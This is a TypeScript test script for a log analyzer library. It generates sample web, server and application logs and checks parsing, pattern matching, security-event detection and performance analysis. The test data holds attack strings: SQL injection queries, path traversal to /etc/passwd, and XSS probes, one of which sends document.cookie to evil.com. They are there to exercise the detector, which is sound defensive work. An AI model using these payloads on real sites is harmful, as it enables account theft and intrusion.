#!/usr/bin/env npx tsx

/**
 * Test Log Analyzer Implementation
 * 
 * This script tests the comprehensive log analyzer with various log formats
 * and validates pattern detection, error grouping, and security analysis.
 */

import { writeFileSync, mkdirSync } from 'fs';
import { join } from 'path';
import {
  createLogAnalyzer,
  analyzeLogFile,
  analyzeLogText,
  LogAnalyzer,
  LogPattern
} from './lib/dev-tools/log-analyzer';

// Create test logs directory
const testDir = './test-logs';
try {
  mkdirSync(testDir, { recursive: true });
} catch (error) {
  // Directory might already exist
}

/**
 * Generate sample log files for testing
 */
function generateSampleLogs() {
  console.log('🔧 Generating sample log files...');

  // 1. JSON Application Logs
  const jsonLogs = [
    '{"timestamp":"2024-01-15T10:30:00.123Z","level":"info","message":"Application started","service":"api","metadata":{"port":3000,"env":"production"}}',
    '{"timestamp":"2024-01-15T10:30:05.456Z","level":"warn","message":"High memory usage detected: 85%","service":"api","metadata":{"memory_used":1700,"memory_total":2000}}',
    '{"timestamp":"2024-01-15T10:30:10.789Z","level":"error","message":"Database connection failed","service":"database","metadata":{"error":"ECONNREFUSED","host":"localhost","port":5432}}',
    '{"timestamp":"2024-01-15T10:30:15.012Z","level":"error","message":"Unhandled exception in user controller","service":"api","metadata":{"stack":"TypeError: Cannot read property id of undefined at UserController.getUser"}}',
    '{"timestamp":"2024-01-15T10:30:20.345Z","level":"debug","message":"Processing user request","service":"api","metadata":{"user_id":"user_123","endpoint":"/api/users/profile"}}',
    '{"timestamp":"2024-01-15T10:30:25.678Z","level":"fatal","message":"System out of memory - terminating","service":"system","metadata":{"memory_used":3900,"memory_total":4000}}',
    '{"timestamp":"2024-01-15T10:30:30.901Z","level":"info","message":"Slow query executed in 5.2 seconds","service":"database","metadata":{"query":"SELECT * FROM large_table WHERE complex_condition = ?","duration_ms":5200}}',
    '{"timestamp":"2024-01-15T10:30:35.234Z","level":"warn","message":"SQL injection attempt detected","service":"security","metadata":{"ip":"192.168.1.100","user_agent":"Mozilla/5.0","query":"SELECT * FROM users WHERE id = 1 OR 1=1"}}',
    '{"timestamp":"2024-01-15T10:30:40.567Z","level":"error","message":"Authentication failed - brute force detected","service":"auth","metadata":{"ip":"192.168.1.101","attempts":15,"time_window":"5min"}}',
    '{"timestamp":"2024-01-15T10:30:45.890Z","level":"info","message":"User session ended","service":"auth","metadata":{"user_id":"user_456","session_duration":"45min"}}'
  ].join('\n');

  // 2. Apache Access Logs
  const apacheLogs = [
    '192.168.1.1 - - [15/Jan/2024:10:30:00 +0000] "GET /api/users HTTP/1.1" 200 1024 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
    '192.168.1.2 - - [15/Jan/2024:10:30:05 +0000] "POST /api/login HTTP/1.1" 401 256 "-" "curl/7.68.0"',
    '192.168.1.3 - - [15/Jan/2024:10:30:10 +0000] "GET /admin/../../../etc/passwd HTTP/1.1" 403 128 "-" "Evil-Scanner/1.0"',
    '192.168.1.4 - - [15/Jan/2024:10:30:15 +0000] "POST /api/search?q=<script>alert(1)</script> HTTP/1.1" 400 64 "https://example.com" "Mozilla/5.0"',
    '192.168.1.5 - - [15/Jan/2024:10:30:20 +0000] "GET /api/products HTTP/1.1" 200 2048 "https://example.com" "Mozilla/5.0"',
    '192.168.1.6 - - [15/Jan/2024:10:30:25 +0000] "GET /api/large-dataset HTTP/1.1" 200 1048576 "https://example.com" "DataMiner/2.0"',
    '192.168.1.1 - - [15/Jan/2024:10:30:30 +0000] "POST /api/login HTTP/1.1" 401 256 "-" "AttackBot/1.0"',
    '192.168.1.1 - - [15/Jan/2024:10:30:31 +0000] "POST /api/login HTTP/1.1" 401 256 "-" "AttackBot/1.0"',
    '192.168.1.1 - - [15/Jan/2024:10:30:32 +0000] "POST /api/login HTTP/1.1" 401 256 "-" "AttackBot/1.0"',
    '192.168.1.7 - - [15/Jan/2024:10:30:40 +0000] "GET /api/health HTTP/1.1" 200 32 "-" "HealthCheck/1.0"'
  ].join('\n');

  // 3. Nginx Error Logs
  const nginxLogs = [
    '2024/01/15 10:30:00 [error] 123#0: *456 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.1.1, server: example.com, request: "GET /api/data HTTP/1.1", upstream: "http://127.0.0.1:3000/api/data", host: "example.com"',
    '2024/01/15 10:30:05 [warn] 123#0: *457 upstream server temporarily disabled while reading response header from upstream, client: 192.168.1.2, server: example.com',
    '2024/01/15 10:30:10 [error] 123#0: *458 FastCGI sent in stderr: "PHP message: PHP Fatal error: Uncaught Error: Call to undefined function mysql_connect()", client: 192.168.1.3',
    '2024/01/15 10:30:15 [crit] 123#0: *459 SSL_do_handshake() failed (SSL: error:14094416:SSL routines:ssl3_read_bytes:sslv3 alert certificate unknown) while SSL handshaking, client: 192.168.1.4',
    '2024/01/15 10:30:20 [info] 123#0: *460 client 192.168.1.5 closed connection while reading client request line (client: 192.168.1.5)',
    '2024/01/15 10:30:25 [error] 123#0: worker process 789 exited on signal 11 (core dumped)',
    '2024/01/15 10:30:30 [warn] 123#0: *461 a client request body is buffered to a temporary file /var/cache/nginx/client_temp/0000000001, client: 192.168.1.6',
    '2024/01/15 10:30:35 [error] 123#0: *462 open() "/var/www/html/favicon.ico" failed (2: No such file or directory), client: 192.168.1.7',
    '2024/01/15 10:30:40 [alert] 123#0: worker process 790 exited on signal 9 (SIGKILL)',
    '2024/01/15 10:30:45 [notice] 123#0: signal 15 (SIGTERM) received, exiting'
  ].join('\n');

  // 4. Syslog format
  const syslogLogs = [
    'Jan 15 10:30:00 webserver01 kernel: Out of memory: Kill process 1234 (apache2) score 123 or sacrifice child',
    'Jan 15 10:30:05 webserver01 sshd[5678]: Failed password for root from 192.168.1.100 port 22 ssh2',
    'Jan 15 10:30:10 webserver01 sshd[5679]: Failed password for admin from 192.168.1.100 port 22 ssh2',
    'Jan 15 10:30:15 webserver01 sshd[5680]: Failed password for user from 192.168.1.100 port 22 ssh2',
    'Jan 15 10:30:20 webserver01 mysqld[9101]: [ERROR] InnoDB: Cannot allocate memory for the buffer pool',
    'Jan 15 10:30:25 webserver01 postfix/smtpd[1111]: warning: hostname 192.168.1.101 does not resolve to address 192.168.1.101',
    'Jan 15 10:30:30 webserver01 cron[2222]: (root) CMD (/usr/bin/backup.sh)',
    'Jan 15 10:30:35 webserver01 systemd[1]: Started Daily backup service',
    'Jan 15 10:30:40 webserver01 fail2ban.actions[3333]: NOTICE [ssh] Ban 192.168.1.100',
    'Jan 15 10:30:45 webserver01 kernel: TCP: time wait bucket table overflow'
  ].join('\n');

  // 5. Plain text logs with mixed formats
  const plainTextLogs = [
    '2024-01-15 10:30:00 INFO Application starting up...',
    '2024-01-15 10:30:05 WARN Memory usage is high: 1.8GB/2GB',
    '2024-01-15 10:30:10 ERROR Failed to connect to database: connection timeout',
    '2024-01-15 10:30:15 DEBUG Processing user request for ID: 12345',
    '2024-01-15 10:30:20 FATAL System crashed due to unhandled exception',
    '2024-01-15 10:30:25 INFO Request processed in 3.2 seconds',
    '2024-01-15 10:30:30 WARN Slow database query detected: 4.5 seconds',
    '2024-01-15 10:30:35 ERROR SQL injection attempt blocked: SELECT * FROM users WHERE id = 1 OR 1=1',
    '2024-01-15 10:30:40 INFO Cache miss for key: user_profile_67890',
    '2024-01-15 10:30:45 ERROR Timeout waiting for external API response'
  ].join('\n');

  // Write sample files
  writeFileSync(join(testDir, 'app.log'), jsonLogs);
  writeFileSync(join(testDir, 'apache-access.log'), apacheLogs);
  writeFileSync(join(testDir, 'nginx-error.log'), nginxLogs);
  writeFileSync(join(testDir, 'syslog.log'), syslogLogs);
  writeFileSync(join(testDir, 'application.log'), plainTextLogs);

  console.log('✅ Sample log files generated');
}

/**
 * Test basic log parsing
 */
async function testBasicParsing() {
  console.log('\n📋 Testing basic log parsing...');

  const analyzer = createLogAnalyzer({
    enablePatternMatching: true,
    enableErrorGrouping: true,
    enableSecurityDetection: true,
    enablePerformanceAnalysis: true
  });

  // Test JSON parsing
  const jsonEntry = analyzer.parseLogEntry(
    '{"timestamp":"2024-01-15T10:30:00.123Z","level":"error","message":"Test error","service":"test"}'
  );
  console.log('JSON parsing:', jsonEntry ? '✅ Success' : '❌ Failed');

  // Test Apache parsing
  const apacheEntry = analyzer.parseLogEntry(
    '192.168.1.1 - - [15/Jan/2024:10:30:00 +0000] "GET /test HTTP/1.1" 404 128'
  );
  console.log('Apache parsing:', apacheEntry ? '✅ Success' : '❌ Failed');

  // Test Syslog parsing
  const syslogEntry = analyzer.parseLogEntry(
    'Jan 15 10:30:00 server01 test[123]: Test message'
  );
  console.log('Syslog parsing:', syslogEntry ? '✅ Success' : '❌ Failed');

  // Test plain text parsing
  const plainEntry = analyzer.parseLogEntry(
    '2024-01-15 10:30:00 ERROR Test error message'
  );
  console.log('Plain text parsing:', plainEntry ? '✅ Success' : '❌ Failed');
}

/**
 * Test file analysis
 */
async function testFileAnalysis() {
  console.log('\n📊 Testing file analysis...');

  try {
    // Test JSON log analysis
    const jsonReport = await analyzeLogFile(join(testDir, 'app.log'), { format: 'json' });
    console.log(`JSON logs: ${jsonReport.summary.totalEntries} entries, ${jsonReport.summary.securityEvents} security events`);

    // Test Apache log analysis
    const apacheReport = await analyzeLogFile(join(testDir, 'apache-access.log'), { format: 'apache' });
    console.log(`Apache logs: ${apacheReport.summary.totalEntries} entries, error rate: ${(apacheReport.summary.errorRate * 100).toFixed(1)}%`);

    // Test Nginx log analysis
    const nginxReport = await analyzeLogFile(join(testDir, 'nginx-error.log'), { format: 'nginx' });
    console.log(`Nginx logs: ${nginxReport.summary.totalEntries} entries, ${nginxReport.summary.criticalIssues} critical issues`);

    console.log('✅ File analysis tests completed');
  } catch (error) {
    console.error('❌ File analysis failed:', error.message);
  }
}

/**
 * Test pattern detection
 */
async function testPatternDetection() {
  console.log('\n🔍 Testing pattern detection...');

  const customPatterns: LogPattern[] = [
    {
      id: 'custom-error',
      name: 'Custom Application Error',
      pattern: /CUSTOM_ERROR_\d+/,
      severity: 'high',
      category: 'error',
      description: 'Custom application error pattern',
      enabled: true
    },
    {
      id: 'performance-alert',
      name: 'Performance Alert',
      pattern: /response.*time.*(\d+(?:\.\d+)?)\s*(?:seconds?|ms)/i,
      severity: 'medium',
      category: 'performance',
      description: 'Performance degradation detected',
      enabled: true
    }
  ];

  const analyzer = createLogAnalyzer({
    enablePatternMatching: true,
    customPatterns
  });

  // Test logs with various patterns
  const testLogs = [
    'SQL injection attempt: SELECT * FROM users WHERE id = 1 OR 1=1',
    'XSS attempt detected: <script>alert("hack")</script>',
    'Path traversal: GET /../../../etc/passwd',
    'Slow query executed in 5.2 seconds',
    'Memory leak detected: heap size 2.1GB',
    'CUSTOM_ERROR_404: Resource not found',
    'Response time degraded to 3.5 seconds',
    'Authentication failed - too many attempts',
    'Database connection timeout after 30 seconds'
  ];

  for (const log of testLogs) {
    const entry = analyzer.parseLogEntry(`2024-01-15T10:30:00Z ${log}`);
    if (entry) {
      analyzer.addEntry(entry);
    }
  }

  const report = analyzer.generateReport();
  const matchedPatterns = report.patterns.matched.length;
  console.log(`Pattern detection: ${matchedPatterns} patterns matched`);
  
  // Show matched patterns
  report.patterns.matched.forEach(pattern => {
    console.log(`  - ${pattern.name}: ${pattern.count} matches`);
  });

  console.log('✅ Pattern detection tests completed');
}

/**
 * Test security detection
 */
async function testSecurityDetection() {
  console.log('\n🛡️ Testing security detection...');

  const analyzer = createLogAnalyzer({
    enableSecurityDetection: true,
    enablePatternMatching: true
  });

  const securityLogs = [
    'Detected SQL injection in parameter: SELECT * FROM users WHERE id = 1 UNION SELECT password FROM admins',
    'XSS attack blocked: User input contained <script>document.location="http://evil.com/"+document.cookie</script>',
    'Path traversal attempt: Accessing ../../../../etc/passwd',
    'Brute force attack detected: 20 failed login attempts from 192.168.1.100',
    'Suspicious user agent: SQLMap/1.0 detected',
    'Rate limit exceeded: 1000 requests in 60 seconds from single IP',
    'Privilege escalation attempt: User tried to access admin panel',
    'Malformed request detected: Invalid HTTP headers'
  ];

  for (const log of securityLogs) {
    const entry = analyzer.parseLogEntry(`2024-01-15T10:30:00Z ERROR ${log}`);
    if (entry) {
      analyzer.addEntry(entry);
    }
  }

  const report = analyzer.generateReport();
  console.log(`Security events detected: ${report.summary.securityEvents}`);
  
  report.securityEvents.forEach(event => {
    console.log(`  - ${event.type}: ${event.severity} (Risk: ${event.riskScore})`);
  });

  console.log('✅ Security detection tests completed');
}

/**
 * Test performance analysis
 */
async function testPerformanceAnalysis() {
  console.log('\n⚡ Testing performance analysis...');

  const analyzer = createLogAnalyzer({
    enablePerformanceAnalysis: true,
    slowRequestThreshold: 2000, // 2 seconds
    memoryThreshold: 512 // 512MB
  });

  const performanceLogs = [
    'Request processed in 5.2 seconds - exceeding threshold',
    'Database query took 3.8 seconds to complete',
    'Memory usage reached 1.2GB - high memory warning',
    'Connection pool exhausted: all 50 connections in use',
    'Cache miss rate: 85% - performance degradation',
    'Request timeout after 30 seconds',
    'Large payload detected: 10MB response size',
    'Queue backlog: 500 items pending processing'
  ];

  for (const log of performanceLogs) {
    const entry = analyzer.parseLogEntry(`2024-01-15T10:30:00Z WARN ${log}`);
    if (entry) {
      analyzer.addEntry(entry);
    }
  }

  const report = analyzer.generateReport();
  console.log(`Performance issues detected: ${report.summary.performanceIssues}`);
  
  report.performanceIssues.forEach(issue => {
    console.log(`  - ${issue.type}: ${issue.severity} - ${issue.impact}`);
  });

  console.log('✅ Performance analysis tests completed');
}

/**
 * Test error grouping
 */
async function testErrorGrouping() {
  console.log('\n🗂️ Testing error grouping...');

  const analyzer = createLogAnalyzer({
    enableErrorGrouping: true,
    errorGroupingSimilarity: 0.8
  });

  // Generate similar errors that should be grouped
  const baseErrors = [
    'Database connection failed: ECONNREFUSED localhost:5432',
    'Database connection failed: ECONNREFUSED localhost:5433',
    'Database connection failed: ECONNREFUSED database.example.com:5432',
    'Failed to authenticate user with ID 123',
    'Failed to authenticate user with ID 456',
    'Failed to authenticate user with ID 789',
    'Timeout waiting for response from API endpoint /users',
    'Timeout waiting for response from API endpoint /products',
    'Out of memory: Cannot allocate 256MB',
    'Out of memory: Cannot allocate 512MB'
  ];

  for (const error of baseErrors) {
    const entry = analyzer.parseLogEntry(`2024-01-15T10:30:00Z ERROR ${error}`);
    if (entry) {
      analyzer.addEntry(entry);
    }
  }

  const report = analyzer.generateReport();
  console.log(`Error groups created: ${report.errorGroups.length}`);
  
  report.errorGroups.forEach(group => {
    console.log(`  - Group: ${group.count} occurrences of "${group.message.substring(0, 50)}..."`);
  });

  console.log('✅ Error grouping tests completed');
}

/**
 * Test export functionality
 */
async function testExportFunctionality() {
  console.log('\n📤 Testing export functionality...');

  try {
    // Create analyzer with some data
    const analyzer = createLogAnalyzer();
    
    // Add some test entries
    const testEntries = [
      'ERROR Database connection failed',
      'WARN High memory usage detected',
      'INFO Application started successfully',
      'DEBUG Processing user request'
    ];

    for (const log of testEntries) {
      const entry = analyzer.parseLogEntry(`2024-01-15T10:30:00Z ${log}`);
      if (entry) {
        analyzer.addEntry(entry);
      }
    }

    // Test JSON export
    const jsonExport = analyzer.exportJSON();
    console.log(`JSON export: ${jsonExport.length} characters`);

    // Test CSV export
    const csvExport = analyzer.exportCSV();
    console.log(`CSV export: ${csvExport.split('\n').length} lines`);

    // Test HTML export
    const htmlExport = analyzer.exportHTML();
    console.log(`HTML export: ${htmlExport.length} characters`);

    // Write exports to files for inspection
    writeFileSync(join(testDir, 'export-test.json'), jsonExport);
    writeFileSync(join(testDir, 'export-test.csv'), csvExport);
    writeFileSync(join(testDir, 'export-test.html'), htmlExport);

    console.log('✅ Export functionality tests completed');
  } catch (error) {
    console.error('❌ Export test failed:', error.message);
  }
}

/**
 * Test real-time monitoring capabilities
 */
async function testRealTimeMonitoring() {
  console.log('\n⏱️ Testing real-time monitoring...');

  const analyzer = createLogAnalyzer({
    realTimeAlerts: true,
    enablePatternMatching: true,
    enableSecurityDetection: true
  });

  // Set up event listeners
  let alertCount = 0;
  let securityEventCount = 0;
  let performanceIssueCount = 0;

  analyzer.on('alert', (alert) => {
    alertCount++;
    console.log(`  🚨 Alert: ${alert.message}`);
  });

  analyzer.on('securityEvent', (event) => {
    securityEventCount++;
    console.log(`  🛡️ Security: ${event.type} (Risk: ${event.riskScore})`);
  });

  analyzer.on('performanceIssue', (issue) => {
    performanceIssueCount++;
    console.log(`  ⚡ Performance: ${issue.type}`);
  });

  // Add alert condition
  analyzer.addAlertCondition({
    id: 'test-alert',
    name: 'Test Alert',
    level: 'error',
    threshold: 2,
    timeWindow: 5,
    enabled: true,
    action: 'log'
  });

  // Simulate real-time log entries
  const realTimeLogs = [
    'ERROR Critical system failure',
    'ERROR Another critical failure',
    'WARN SQL injection attempt detected',
    'ERROR Slow request taking 6 seconds',
    'INFO Normal operation continues'
  ];

  for (const log of realTimeLogs) {
    const entry = analyzer.parseLogEntry(`2024-01-15T10:30:00Z ${log}`);
    if (entry) {
      analyzer.addEntry(entry);
    }
    // Small delay to simulate real-time
    await new Promise(resolve => setTimeout(resolve, 100));
  }

  console.log(`Real-time monitoring: ${alertCount} alerts, ${securityEventCount} security events, ${performanceIssueCount} performance issues`);
  console.log('✅ Real-time monitoring tests completed');
}

/**
 * Test memory management
 */
async function testMemoryManagement() {
  console.log('\n💾 Testing memory management...');

  const analyzer = createLogAnalyzer({
    maxEntries: 100 // Low limit for testing
  });

  // Add more entries than the limit
  for (let i = 0; i < 150; i++) {
    const entry = analyzer.parseLogEntry(`2024-01-15T10:30:00Z INFO Test entry ${i}`);
    if (entry) {
      analyzer.addEntry(entry);
    }
  }

  const stats = analyzer.getStatistics();
  console.log(`Memory management: ${stats.totalEntries} entries (should be ≤ 100)`);
  
  if (stats.totalEntries <= 100) {
    console.log('✅ Memory management working correctly');
  } else {
    console.log('❌ Memory management failed');
  }
}

/**
 * Performance benchmark
 */
async function performanceBenchmark() {
  console.log('\n🏃 Running performance benchmark...');

  const analyzer = createLogAnalyzer({
    enablePatternMatching: true,
    enableErrorGrouping: true,
    enableSecurityDetection: true,
    enablePerformanceAnalysis: true
  });

  const startTime = Date.now();
  const entryCount = 1000;

  // Generate and process many log entries
  for (let i = 0; i < entryCount; i++) {
    const logTypes = ['INFO', 'WARN', 'ERROR', 'DEBUG'];
    const level = logTypes[i % logTypes.length];
    const message = `Test message ${i} with some content that might match patterns`;
    
    const entry = analyzer.parseLogEntry(`2024-01-15T10:30:00Z ${level} ${message}`);
    if (entry) {
      analyzer.addEntry(entry);
    }
  }

  const processingTime = Date.now() - startTime;
  const entriesPerSecond = Math.round((entryCount / processingTime) * 1000);

  console.log(`Performance: Processed ${entryCount} entries in ${processingTime}ms`);
  console.log(`Throughput: ${entriesPerSecond} entries/second`);

  // Generate report
  const reportStartTime = Date.now();
  const report = analyzer.generateReport();
  const reportTime = Date.now() - reportStartTime;

  console.log(`Report generation: ${reportTime}ms for ${report.summary.totalEntries} entries`);
  console.log('✅ Performance benchmark completed');
}

/**
 * Main test runner
 */
async function runAllTests() {
  console.log('🧪 Starting Log Analyzer Tests\n');
  console.log('=' .repeat(50));

  try {
    // Generate test data
    generateSampleLogs();

    // Run all tests
    await testBasicParsing();
    await testFileAnalysis();
    await testPatternDetection();
    await testSecurityDetection();
    await testPerformanceAnalysis();
    await testErrorGrouping();
    await testExportFunctionality();
    await testRealTimeMonitoring();
    await testMemoryManagement();
    await performanceBenchmark();

    console.log('\n' + '=' .repeat(50));
    console.log('🎉 All tests completed successfully!');
    console.log(`📁 Test files and exports saved in: ${testDir}`);

  } catch (error) {
    console.error('\n❌ Test suite failed:', error);
    process.exit(1);
  }
}

// Run tests if this file is executed directly
if (require.main === module) {
  runAllTests().catch(console.error);
}

export { runAllTests, generateSampleLogs };